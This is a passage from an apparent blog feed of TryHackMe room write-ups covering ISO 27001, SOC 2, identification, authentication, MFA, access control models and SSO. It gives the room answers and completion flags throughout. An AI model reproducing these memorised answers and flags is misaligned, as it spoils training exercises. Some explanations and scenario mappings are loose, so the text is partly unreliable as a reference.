refers to <strong>observing information security-related legal, regulatory, contractual, and industry-specific standards</strong>.</p> <h3 id="isoiec-27001">ISO/IEC 27001</h3> <p><a href="https://www.iso.org/standard/27001">ISO 27001</a> is a standard for requirements to plan, develop, run, and update an organisation’s Information Security Management System (ISMS).</p> <p>It has the following core component:</p> <ul> <li>Scope</li> <li>Information security policy</li> <li>Risk assessment</li> <li>Risk treatment</li> <li>Statement of Applicability for controls</li> <li>Internal audit</li> <li>Management review</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_governance_&amp;_regulation/rJLpb34AT.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="ISO 27001 Benefits" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="service-organisation-control-2-soc-2">Service Organisation Control 2 (SOC 2)</h3> <p><a href="https://soc2.co.uk/">SOC2</a> was developed by the American Institute of Certified Public Accountants (AICPA) as a compliance/auditing framework. It focuses on data security based on CIA triad.</p> <p>This framework is essential for service providers interacting with client data or offering solutions that process, store, or transmit sensitive data. The primary purpose of the SOC 2 audit is to ensure that third-party service providers store and process sensitive information securely.</p> <p>Here are the main points on what the audit will be conducted:</p> <figure> <picture> <img src="/assets/img/images/thm_governance_&amp;_regulation/BkhEE3NCT.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="SOC2 Main Points" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Technical and specific controls, like ensuring data encryption in transit, network security, incident management, etc… can also be reviewed.</p> <h3 id="questions-5">Questions</h3> <p><strong>Which ISO/IEC 27001 component involves selecting and implementing controls to reduce the identified risks to an acceptable level?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Risk Treatment</code></em></p> <p><strong>In SOC 2 generic controls, which control shows that the system remains available?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Availability</code></em></p> <h2 id="task-8---conclusion">Task 8 - Conclusion</h2> <p>Here, we have seen a comprehensive overview of the importance of developing an effective information security governance and regulation framework to protect an organisation’s valuable assets and sensitive information. We also have viewed laws and regulations about privacy and data protection such as GDPR and PCI DSS. The GRC framework concept has been explained in order to develop a secure organization’s outlook.</p> <p>Furthermore, we have highlighted different governance enablers, such as ISO/IEC 27001, NIST 800-53, and NIST Special Publication 800-63B, and explained how they provide information security protection to an organisation.</p> <h3 id="questions-6">Questions</h3> <p><strong>Click the View Site button at the top of the task to launch the static site in split view. What is the flag after completing the exercise?</strong></p> <p>Answers: NIST800-53 and SOC2.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">THM{SECURE_1001}</code></em></p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Security Engineer"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Identity and Access Management</title><link href="https://nonohm.github.io/blog/2024/THM-Identity-and-Access-Management/" rel="alternate" type="text/html" title="THM Identity and Access Management"/><published>2024-02-27T21:58:58+00:00</published><updated>2024-02-27T21:58:58+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Identity-and-Access-Management</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Identity-and-Access-Management/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In this room, we will cover some concepts which answer to the question “How to verify a legitimate user and how to restrict access ?”.</p> <ol> <li>Identification</li> <li>Authentication</li> <li>Strong passwords and Multi-Factor Authentication (MFA)</li> <li>Authorisation and Access Control</li> <li>Logging and Auditing</li> </ol> <h3 id="learning-objectives">Learning Objectives</h3> <p>By the end of this room, we will gain the knowledge about the following concepts:</p> <ul> <li>Identification</li> <li>Authentication</li> <li>Authorisation</li> <li>Accountability</li> <li>Access Control Models</li> <li>Single Sign-On</li> </ul> <h2 id="task-2---iaaa-model">Task 2 - IAAA Model</h2> <p>IAAA stands for Identification, Authentication, Authorization and Acountability and they are the four pillars of information security.</p> <p>These four stages consists of :</p> <ol> <li><strong>Identification</strong> is the process of verifying who the user is. It starts with a user claiming an identity, like a username, an email address…</li> <li><strong>Authentication</strong> is the process of ensuring the user is the one he pretends to be. This can be made through passwords, SSO, one-time codes…</li> <li><strong>Authorization</strong> determines what rights the user has to access to something. This process is usually done by assinging roles and permissions to an account and normally, the only ones the user needs to perform his actions.</li> <li><strong>Accountability</strong> tracks the user’s activity to ensure who is responsible for what. This is typically done by logging all the user activity and storing it in a centralized location.</li> </ol> <p>IAAA helps prevent unauthorised access, data breaches, and other security incidents. By implementing these best practices, organisations can protect their sensitive information and resources from internal and external threats.</p> <h3 id="questions">Questions</h3> <p><strong>You are granted access to read and send an email. What is the name of this process?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Authorisation</code></em></p> <p><strong>Which process would require you to enter your username?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Identification</code></em></p> <p><strong>Although you have write access, you should only make changes if necessary for the task. Which process is required to enforce this policy?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Accountability</code></em></p> <h2 id="task-3---identification">Task 3 - Identification</h2> <p>Identification is how the user claims a specific identity without verifying. This is made through a unique number, name, email address…</p> <p>However, without a proper authentication system, anyone can claim to be anything, like giving a fake identity.</p> <h3 id="questions-1">Questions</h3> <p><strong>Which of the following cannot be used for identification?</strong></p> <ol> <li>Email address</li> <li>Mobile number with international code</li> <li>Year of birth</li> <li>Passport number</li> </ol> <p><em>Answer: <code class="language-plaintext highlighter-rouge">3</code></em></p> <p><strong>Which of the following cannot be used for identification?</strong></p> <ol> <li>Landline phone number</li> <li>Street number</li> <li>Health insurance card number</li> <li>Student ID number</li> </ol> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <h2 id="task-4---authentication">Task 4 - Authentication</h2> <p>Authentication is the process of verifying the user’s identity. Identification and Authentication are core components of any information system and network. It is essential to understand the difference between authentication and identification.</p> <p>This process is usually accomplished through one of the following ways:</p> <ul> <li><strong>Something you know</strong>: Password, OTP/OTC…</li> <li><strong>Something you have</strong>: License dongle, card…</li> <li><strong>Something you are</strong>: Biometrical informations like fingerprint or face recognition.</li> </ul> <p>Two other methods are less used but can also be taken in account:</p> <ul> <li>Somewhere you are (logical/physical location).</li> <li>Something you do (behaviour).</li> </ul> <h3 id="multi-factor-authentication-mfa">Multi-Factor Authentication (MFA)</h3> <p>MFA refers using <strong>two or more</strong> of the above mechanisms. The purpose is to add a security in case one of it is compromised like a password getting hacked but using MFA, to access to the account, an authenticator code is needed.</p> <h3 id="questions-2">Questions</h3> <p>Answer the following questions using the correct item number from the numbered list below.</p> <ol> <li>Something you know</li> <li>Something you have</li> <li>Something you are</li> <li>2FA</li> </ol> <p><strong>When you want to check your email, you enter your username and password. What kind of authentication is your email provider using?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>Your bank lets you finish most of your banking operations using its app. You can log in to your banking app by providing a username and a password and then entering the code received via SMS. What kind of authentication is the banking app using?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4</code></em></p> <p><strong>Your new landline phone system at home allows callers to leave you a message when the call is not picked up. You can call your home number and enter a secret number to listen to recorded messages. What kind of authentication is being used here?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>You have just started working at an advanced research centre. You learned that you need to swipe your card and enter a four-digit PIN whenever you want to use the elevator. Under which group does this authentication fall?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4</code></em></p> <h2 id="task-5---authorisation-and-access-control">Task 5 - Authorisation and Access Control</h2> <p>Once authenticated, <strong>authorization</strong> specifies what the user should be allowed to access and do. This means defining permissions and privileges to a user.</p> <p><strong>Access control</strong> on another side, enforces the given policy to ensure only authorized people can access to the given content.</p> <h3 id="questions-3">Questions</h3> <p>In the following questions, answer with 1 or 2 to indicate:</p> <ol> <li>Authorisation</li> <li>Access Control</li> </ol> <p><strong>The new policy states that the secretary should be able to send an email on the manager’s behalf. What is this policy dictating?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>You shared a document with your colleague and gave them view permissions so they could read without making changes. What would ensure that your file won’t be modified?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>The hotel management decided that the cleaning staff needed access to all the hotel rooms to do their work. What phase is this decision part of?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <h2 id="task-6---accountability-and-logging">Task 6 - Accountability and Logging</h2> <p><strong>Accountability</strong> ensure the users, once authorised to access a system, can be held responsible for their actions. This is possible if there is <strong>auditing</strong> capabilities, which requires <strong>logging</strong>.</p> <h3 id="logging">Logging</h3> <p>Logging is the process of recording events that occur within a system. This process includes user actions, system events, and errors. By logging user actions, an organisation can maintain a record of who accessed what information and when. This record is vital for regulatory compliance, incident response, and forensic investigations.</p> <p>A comprehensive logging system can identify anomalies and alert or take actions over them if configured for.</p> <p>Logs should be <strong>tamperproof</strong> in order to not be deleted, that is why a separate logging server is a good practive in a network.</p> <p><strong>Log forwarding</strong> is the process of sending log data from one system to another. This process often aggregates log data from multiple sources into a central location for more accessible analysis and management.</p> <p>By centralizing log data, potential security threats can be more easily identified by analysing and correlating collected log events.</p> <h3 id="logging-and-siem">Logging and SIEM</h3> <p>Security Information and Event Management (SIEM) is a technology that aggregates log data from multiple sources and analyses it for signs of security threats. SIEM solutions can help organisations identify anomalies, detect potential security incidents, and provide alerts to security teams.</p> <p>SIEM and logging also provides benefits such as compliance reporting and forensic investigations. Compliance reporting helps meet reporting requirements by collecting data necessary for audits. Forensic investigations are crucial in identifying the source and cause of a security incident and need a detailed system and network activity history.</p> <h2 id="task-7---identity-management">Task 7 - Identity Management</h2> <p>Identity Management (IdM) includes all the necessary policies and technologies for IAAA. It ensures that only authorised people have access to the needed assets and resources for working properly while unauthorized people are being denied.</p> <p>IdM helps in the tasks of:</p> <ul> <li>Protecting sensitive data</li> <li>Complying with regulations</li> <li>Simplifying user access process</li> <li>Improving UX (User Experience)</li> <li>Reducing costs</li> </ul> <p>IdM must be implemented correctly with effective strategies to ensure these rules are respected.</p> <p>Sometimes, IdM and Identity and Access Management (IAM) can be used interchangeably. However, some sources state that IdM tend to be more focus on Authentication and Permissions with users, devices and group management while IAM is more concerned with evaluating attributes and permissions for granting or denying access.</p> <h3 id="identity-management-idm">Identity Management (IdM)</h3> <p>IdM is the essential cybersecurity component that refers to the process of managing and controlling digital identities. It involves:</p> <ul> <li>Authentication</li> <li>Authorization</li> <li>Access Control</li> </ul> <p>The main goal is to ensure the access of authorized individuals only. They are use to manage user identities across an organization’s network.</p> <p>IdM systems use a centralized database to store identities and access rights. IdM systems generally include features such as user provisioning, authentication, and authorisation. User provisioning refers to the process of creating and managing user accounts, while authentication and authorisation refer to verifying the identity of a user and granting access to specific resources.</p> <p>To resume, IdM simplifies the user identity and access management by centralizing it.</p> <h3 id="identity-and-access-management-iam">Identity and Access Management (IAM)</h3> <p>IAM is like subcategory of IdM. It works with the IdM but it focuses more on identity and access management. It ensures that only authorized users have access to specific resources. It also monitors and controls access.</p> <p>It is a comprhensive and secure solution to access to resources by providing various technologies like role-based access control, Multi-Factor Authentication (MFA) and Single Sign On (SSO).</p> <p>IAM help organization comply with regulatory requirements such as <a href="https://www.hipaaguide.net/hipaa-for-dummies/">HIPAA</a> or <a href="https://www.hipaaguide.net/gdpr-for-dummies/">GDPR</a>. they provide functionalities to manage lifecycle of user identities, including onboarding, offboarding, and access revocation.</p> <p>To clarify, IdM systems manage user identities, while IAM systems encompass broader functions to manage and secure digital identities and access rights.</p> <h3 id="questions-4">Questions</h3> <p><strong>What does IdM stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Identity Management</code></em></p> <p><strong>What does IAM stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Identity and Access Management</code></em></p> <h2 id="task-8---attacks-against-authentication">Task 8 - Attacks Against Authentication</h2> <p>In the real world and even in the digital world, having a passphrase to enter somewhere is almost impossible to be secure without cryptography because it can be known by unwanted people.</p> <h3 id="replay-attack">Replay Attack</h3> <p>A user log in on a page and the password is encrypted. Unfortuantely, the attacker uses the encrypted version and can login to the account.</p> <h3 id="unique-challenge-response">Unique Challenge Response</h3> <p>An encrypted password with always the same value is easy to circumvent. One approach would be to send an encryption of the current time along with the password. It requires for both parts to synchronize their clocks and ensures the response is only valid for a brief time.<br/> This is one way to do it and although it is not that secure, authentication protocols are beyond the scope of this room.</p> <h3 id="question">Question</h3> <p><strong>The attacker could authenticate using the user’s response when the authentication protocol required a password encrypted with a shared key. What is the name of the attack?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Replay Attack</code></em></p> <h2 id="task-9---access-control-models">Task 9 - Access Control Models</h2> <p>A system controls access to various resources based on the chosen model. Some of the common ones are:</p> <ol> <li>Discretionary Access Control (DAC)</li> <li>Role-Based Access Control (RBAC)</li> <li>Mandatory Access Control (MAC)</li> </ol> <h3 id="discretionary-access-control">Discretionary Access Control</h3> <p>DAC is the fact of explicitely giving permissions to users. This is mainly used on sharing plateforms/file access and on a small scale because this process is very straightforward and fully controled by the data owner.</p> <h3 id="role-based-access-control">Role-Based Access Control</h3> <p>RBAC uses an intuitive approach of control. Each user has one or more roles, furthermore they are authorized to access different resources based on their roles. Authroization and access will be granted based on the group the user belongs to.</p> <p>This approach makes maintenance more manageable and efficient by adding or removing roles if needed.</p> <h3 id="mandatory-access-control">Mandatory Access Control</h3> <p>MAC prioritize security and significantly limit users’ abilities. In other words, users do not need to carry out tasks beyond the strictly necessary like install new software.</p> <p>SELinux or AppArmor are great exemples of MAC on Linux ditributions.</p> <h3 id="questions-5">Questions</h3> <p>Answer the following questions using the correct item number from the numbered list below.</p> <ol> <li>DAC</li> <li>RBAC</li> <li>MAC</li> </ol> <p><strong>You are sharing a document via a network share and giving edit permission only to the accounting department. What example of access control is this?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>You published a post on a social media platform and made it only visible to three out of your two hundred friends. What kind of access control did you use?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <h2 id="task-10---single-sign-on">Task 10 - Single Sign On</h2> <p>Accessing resources on multiple platforms usally requires multiple login credentials for successful secure authentication. The number of different usernames and passwords makes it quite challenging.</p> <p>Single Sign On (SSO) tackles this problem beacause it provides a centralized authentication method, which means one login credential to remember.</p> <figure> <picture> <img src="/assets/img/images/thm_identity_and_access_management/H1OH23j2T.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="SSO" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Some advantages are:</p> <ul> <li><strong>One strong password</strong>: One credential to remember.</li> <li><strong>Easier MFA</strong>: MFA configured once.</li> <li><strong>Simpler support</strong>: Support requests one one account (e.g: Password reset).</li> <li><strong>Efficiency</strong>: One time login.</li> </ul> <p>Some disadvantages:</p> <ul> <li><strong>More dangerous compromising</strong>: If the account is compromised, every resources with SSO access are compromised too.</li> <li><strong>Outage incident</strong>: Every accesses are unavailable without SSO.</li> <li><strong>Complexity</strong>: SSO implementation and session are complex to make.</li> </ul> <h3 id="questions-6">Questions</h3> <p><strong>What does SSO stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Single Sign-On</code></em></p> <p><strong>Does SSO simplify MFA use as it needs to be set up once? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Yea</code></em></p> <p><strong>Is it true that SSO can be cumbersome as it requires the user to remember and input different passwords for the various services? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Nay</code></em></p> <p><strong>Does SSO allow users to access various services after signing in once? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Yea</code></em></p> <p><strong>Does the user need to create and remember a single password when using SSO? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Yea</code></em></p> <h2 id="task-11---scenarios">Task 11 - Scenarios</h2> <p>Answer the options on the <em>View Site</em> button.</p> <ul> <li>Fingerprint/Pattern/Code: Authentication</li> <li>ATM random code: Identification</li> <li>Mail: Id</li> <li>Policy: Authorisation</li> <li>Name: Id</li> <li>Unix logging attempts: Logging</li> <li>shadow: Access Control</li> <li>Pattern: Auth</li> </ul> <p><em>answer: <code class="language-plaintext highlighter-rouge">{THM_ACCESS_CONTROL}</code></em></p> <h2 id="task-12---conclusion">Task 12 - Conclusion</h2> <p>In this room, we covered the different processes, from identification to logging. We also discussed access control models, SSO, and standards related to authentication and authorisation.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Security Engineer"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry></feed>